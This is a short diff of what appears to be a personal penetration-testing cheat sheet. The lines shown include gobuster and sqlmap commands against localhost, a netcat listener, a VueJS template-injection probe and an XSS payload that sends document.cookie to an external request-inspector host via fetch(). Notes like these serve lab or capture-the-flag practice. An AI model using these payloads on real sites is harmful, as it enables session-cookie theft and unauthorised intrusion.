@@ -46,7 +46,7 @@ gobuster dir -w /usr/share/wordlists/rockyou.txt -u "http://localhost:8000/"
 
 ## nmap
 
-`nc -nlvp 1234`
+nc -nlvp 1234
 
 ## Git
 
@@ -70,11 +70,11 @@ gobuster dir -w /usr/share/wordlists/rockyou.txt -u "http://localhost:8000/"
 
 fetch("https://01hh4df1c5qk1fjks5n8spq9zn00-e4e6c9cb80653f2a86a1.requestinspector.com?"+encodeURIComponent(document.cookie));
 
+VueJS {{7*7}}
+
 ### sqlmap
 
 `sqlmap -u "http://localhost:8000/index.php?id=1" -dbs`
-
-VueJS {{7*7}}
 
 
 
